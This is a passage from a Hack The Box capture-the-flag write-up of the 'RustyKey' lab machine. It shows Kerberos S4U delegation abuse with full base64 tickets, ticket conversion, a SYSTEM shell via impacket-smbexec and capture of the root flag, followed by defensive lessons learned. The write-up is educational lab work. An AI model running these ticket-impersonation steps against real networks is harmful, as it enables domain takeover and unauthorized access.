[*] Using rc4_hmac hash: B52B582F02F8C0CD6320CD5EAB36D9C6
[*] Building AS-REQ (w/ preauth) for: 'rustykey.htb\it-computer3$'
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFmDCCBZSgAwIBBaEDAgEWooIEqDCCBKRhggSgMIIEnKADAgEFoQ4bDFJVU1RZS0VZLkhUQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMcnVzdHlrZXkuaHRio4IEYDCCBFygAwIBF6EDAgECooIETgSCBEp+TNu3I6PqFhK0IrYh/PHC8LAzr3SRItOGE5t4c2e7Dp0OAKA0KsixS/wPPisziM1cTuAmZWtAJa73quNR/p8Ca+3urhaDvJ6JMAzLMPTLwq0P2+gPOiZCjmk6mtl4PKkdsBYAjYbxDB309Rm82LuDXMdrbDheC4cobA7cDpG4z7JT4t7rimVrK5UdMuNsQiQykDhOKQjMdikV9qQ9ih/s6ua1GJUPDHVKBj45f37o9pKR61FdWW1T6nbAGNGQJVbnJA4+C4NgzEPSLZR8tLAVRszodHseQARUprd7Mt9m8Y4Or0YnrVWpohq1cRud+kVEFFtqnqic9vr+orqozxqmUM74wfEzegCSwPU665FBsSHCCzKkViAc6l9qDeYGQlsZwVCkXy+P4BZXXJhU2/XGj1c1pcMja+kMT8K5AZBywnXYTVH6dXotdgsSlaiVoeCfljfYoLogfSSJo10bz/2sGr8cwmieqHuAems5GaGJKDSEXozu8TJvUDypxZ/RI/Lz2ztyt01afNnZEn4Hc0YQ/A7GRDSYbHJ2VDi72xgo9Q/8OPEA7vSaieSi5TD/9Lj4DDO9Fc2gkiHlUJ8xP85FoAI1NEOPEYdZLkObh8JNaxOdhTz5bUBqXqUfoECS5n3rXc7rDRiKzGLXo4ZxfvJUQqvaYJeWkS+9MImsIYcHEEBK0zU6kHEgPh7A9lw9Z1Calqfs6QJzO8LssO6FuSAXV1c+XyJkV39LY7uKHJNtegUOXz1Dfa9ILH1KcJGHT9MLtvX/X+DFZTOuOaZOkjUxH0w+Q6OaoRtvbpPtd8RENPcZzydwRhjGRVokOIrp8IfGUYym8IAkVATtPFlbQvBdNVkNZn6C2a0AaMDT6ufCiGlmaDAVKd3n8zrFcrjv0OlcXrPRzp6Vg88uoCHLdMrF0uUG/ut5IDiHioZULAb3EbRh1atq/DsvAxv3bPsOchQVglnEc3RxojS1hrc9O83N+oafH9TVLEoxIS6WBQE3xCi2f40+ngqhZ9tvAe67tSzFPPf/0/ZvsFTtUiBFHVo1+K9gyZ27rsDpPkmHwoRh9y1we25nbXdnIiEJdKbze8i12Li+Cdno1NUoCng24srC5j3gWOk6+/QfdxmXCWknqNfd34of4XjbWhMvLNbDzqC+gt/Zm715H7nInYJ1hu1Klhkn4j+q7FMsKhDljvR9T1dW3M9FaXn6mSWaYT+qTu1+6fHNNKd402W9aVM/RF13GjG+yXbG0AZpb4k0o4x/YgxxxnuW8cIlMW2h/fYBKJ7tEEChbp9I7NH7ZHAkhAXQBKl9+pcP0GyMlyKbLXzpUVg56+YEqq4dEYqDB8qBAl9EMxAIWrN7bLcLXq+4jbgHeaZgU0J7lwr0ChQvNcN8UMyePH389nDvc25S147msrF16hAhtQIXLtfSi5zsoYu8P98bCnEC6E7OxMeDxMW0+OVqDWb5oC4GJQ2jgdswgdigAwIBAKKB0ASBzX2ByjCBx6CBxDCBwTCBvqAbMBmgAwIBF6ESBBCUZA/V31nGNmdhq+LlgV8ZoQ4bDFJVU1RZS0VZLkhUQqIaMBigAwIBAaERMA8bDWl0LWNvbXB1dGVyMySjBwMFAEDhAAClERgPMjAyNTA4MTAyMzU5MjlaphEYDzIwMjUwODExMDk1OTI5WqcRGA8yMDI1MDgxNzIzNTkyOVqoDhsMUlVTVFlLRVkuSFRCqSEwH6ADAgECoRgwFhsGa3JidGd0GwxydXN0eWtleS5odGI=


[*] Action: S4U

[*] Using domain controller: dc.rustykey.htb (fe80::a64c:ba44:ce1c:8f65%11)
[*] Building S4U2self request for: 'it-computer3$@RUSTYKEY.HTB'
[*] Sending S4U2self request
[+] S4U2self success!
[*] Got a TGS for 'BACKUPADMIN' to 'it-computer3$@RUSTYKEY.HTB'
[*] base64(ticket.kirbi):

      doIFtjCCBbKgAwIBBaEDAgEWooIEzzCCBMthggTHMIIEw6ADAgEFoQ4bDFJVU1RZS0VZLkhUQqIaMBigAwIBAaERMA8bDWl0LWNvbXB1dGVyMySjggSOMIIEiqADAgEXoQMCAQSiggR8BIIEeBRW0d9Nt40wAkSY3p8xnJCftwCGvmHMQNh2+gH1o291p5o/+Bp+oV7s+FsT13GHBWy3XETUC5dzHGF4wg0XwSKKyU+CwsNm4fs936ew+uW0qkSasOsSjkhpqrd1HFejsaG3QLk+Axlorqilui3W4n8wBk6nONBsktzxVk7KiwkmhfMAVvZ1o9BjHgyeiz7WjKaFZDslaPmYFjg77ZM1kbPMpnh4Jfa0/+OQjiBgG0fUW7NGzwSYoBRV57tZRq00ynObJbAIcTLuj0watEkQEw21yMLLumbqhoQkdlk2ZiZ7oPnFY7w2SOYKdhB9tkqin+A5wIJRvAel7nISIQnPqaVHHL7S3uCfEoseumdk4sNS646N5YX8kYYvQOzITKpKbT4k1bT9AKvH4yQ57yb24YEHZIpZe/4IYeKkpC8PO6xAuodH6ee0ifjUEz3rsWoqPf/U36AkfBDuAKZt75klbItB78papcWqW4qWlZYUGtrPriYp+EdigBMgn5uJXBdWCaUCXswcJh26QQ0dCJpswCBzIFxYxF3LQ77aUtym+du7NiRPi8BXETHZSfV2Gbio23Wjl0Hn9fT92sDzrwQ9eymU96611khGLIh+vZq5HCuq7zWqCuWHX2yyTebBvcx0KJGZJZ5d2auwDT9G7q10a06LRnEKfkorAvsC5G8TpWHVcetRjKv3Y0sG30Z5TSlRfE0lin5o+aRJJtdEMTlPRhIJD3dg7Z9za9snY5XnpU6FCQPwpj4agLlPRvz2N/N+v+Xq/H4ATZ4D/EdYIgmvMnCIH7PISNTx+1ky/64LDlBrlgFQ+ClUoIcvyu26AVdXts0OFk40PH9OevYZjUcipScLgrJ/aqvZnoZPk3TH0mXpEO4tyCTBUVI8O248akiEHVjhpESggwwOk5i/T/4r0XyDP+K7GJ0KOFkltvjlzxf6rfcbdyYSgLo4lg0XAoq+d8tcQeH9/kbi5b58zomxsVHAKHCNf1AqrXxAgxHzgOeLTpNLNrOMcfKOaoHngzoZWY9LznBqwo1vDEF8paT0xLzoX4e5XxXe7SxSMgEd21lfflebzvfBm34XgTdROFDtRdw0V2zVX84y9NXwUz27dtdpHsI4+NQRxV9JLRnID56mLZf4FBici7mkiMpgB3xE756+ql42g3dNo1UrfIhcMwzU3vLKSAeCDfvISN0zHyXvgzyjjn9Y5lDGXycd9ThSdK6pBD41aIBIlRcHM9N41bpps4HgmozsGprNghFy8jsf1XnEqZNVauIhfckDh8+7PmKxMejFKCyl7zRYlBSRjk0O5TJF9MKSoGRmqoYXdEewKQqade0GqUbBBNyKYd1CMofvZ4qEew6b5bNssZdxI9PnjFB0V/C/s+DsYBlNVJtVLG9SwaSW9w61c4qGhU7ri0NES81ooXdR/D5MF7F4bgWpMTi0wWWKC1/+NqyLXsMWLR+AZ0UEFJupcL2m2sA+Bwohr8KUk1jXPAwvlZ9M6SmS0STwK9dZQdWxGzHBPNRWxg2aZBBou0ajgdIwgc+gAwIBAKKBxwSBxH2BwTCBvqCBuzCBuDCBtaAbMBmgAwIBF6ESBBCrW/qj42Ptf+uQkTS65JTPoQ4bDFJVU1RZS0VZLkhUQqIYMBagAwIBCqEPMA0bC0JBQ0tVUEFETUlOowcDBQBAoQAApREYDzIwMjUwODEwMjM1OTMwWqYRGA8yMDI1MDgxMTA5NTkyOVqnERgPMjAyNTA4MTcyMzU5MjlaqA4bDFJVU1RZS0VZLkhUQqkaMBigAwIBAaERMA8bDWl0LWNvbXB1dGVyMyQ=

[*] Impersonating user 'BACKUPADMIN' to target SPN 'cifs/dc.rustykey.htb'
[*] Using domain controller: dc.rustykey.htb (fe80::a64c:ba44:ce1c:8f65%11)
[*] Building S4U2proxy request for service: 'cifs/dc.rustykey.htb'
[*] Sending S4U2proxy request
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'cifs/dc.rustykey.htb':

      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
[+] Ticket successfully imported!
```

I copy the `base64` encoded KIRBI file to the attack host and decode it.

```
fcoomans@kali:~/htb/rustykey$ cat BACKUPADMIN.base64
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

fcoomans@kali:~/htb/rustykey$ cat BACKUPADMIN.base64 |base64 -d >BACKUPADMIN.kirbi
```

`impacket-ticketConverter` is used to convert the KIRBI file to a credential cache file.

```
fcoomans@kali:~/htb/rustykey$ impacket-ticketConverter BACKUPADMIN.kirbi BACKUPADMIN.ccache
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] converting kirbi to ccache...
[+] done

fcoomans@kali:~/htb/rustykey$ export KRB5CCNAME=BACKUPADMIN.ccache

fcoomans@kali:~/htb/rustykey$ klist
Ticket cache: FILE:BACKUPADMIN.ccache
Default principal: BACKUPADMIN@RUSTYKEY.HTB

Valid starting       Expires              Service principal
08/11/2025 01:59:30  08/11/2025 11:59:29  cifs/dc.rustykey.htb@RUSTYKEY.HTB
        renew until 08/18/2025 01:59:29
```

`impacket-smbexec` is used to to connect to the server as user `SYSTEM`.

```
fcoomans@kali:~/htb/rustykey$ impacket-smbexec -k -no-pass BACKUPADMIN@dc.rustykey.htb
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>whoami
nt authority\system
```

### 💰 Post-Exploitation

#### 🏆 root.txt

`Administrator` is the holder of the `root.txt` flag.

```
C:\Windows\system32>tree C:\Users\Administrator /a /f
Folder PATH listing
Volume serial number is 00BA-0DBE
C:\USERS\ADMINISTRATOR
+---3D Objects
+---Contacts
+---Desktop
|       root.txt
|
+---Documents
+---Downloads
+---Favorites
|   |   Bing.url
|   |
|   \---Links
+---Links
|       Desktop.lnk
|       Downloads.lnk
|       script_01.ps1
|       script_02.ps1
|
+---Music
+---Pictures
+---Saved Games
+---Searches
\---Videos
```

```
C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
5cc2b513f687668beabcda16ea4dde31
```

After some time hacking, the rusty key finally turned and unlocked the server. Changing the server’s context menu gave me full access.  🕰️🗝️🔓💥

And `RustyKey has been Pwned!` 🎉

![](images/Pasted%20image%2020250810180642.png)

## 📚 Lessons Learned

- **Timeroasting** is a surprisingly effective technique against SNTP services, especially when computer accounts have weak or crackable passwords. Monitoring and securing time services can help mitigate this risk.
- Treat **Computer accounts like user accounts** in your security model. The `IT-Backup3$` account was abused to request TGTs and escalate privileges — demonstrating that computer accounts can be powerful footholds if compromised.
- **Access Control Entries (ACE) must be tightly controlled**. Granting excessive permissions can quickly lead to privilege escalations.
- **DLL hijacking** vulnerabilities are easily exploitable if users or groups can modify context menu registry entries or related keys. Preventing write access to such sensitive locations is crucial.
- **Resource-Based Constrained Delegation (RBCD)** is a powerful feature that, when misconfigured or abused, can lead to full domain compromise. Regular auditing of delegation permissions on computer accounts like `DC$` is essential.
- Overall, this chain highlights how combining seemingly small misconfigurations—weak computer account passwords, lax ACE permissions, and delegation abuse—can result in catastrophic domain compromise.

## ⚠️ Disclaimer

This write-up covers a retired HTB machine and is for educational purposes only. All IPs, credentials, and flags exist in a lab environment. My username is intentionally used throughout this write-up to build my cybersecurity brand.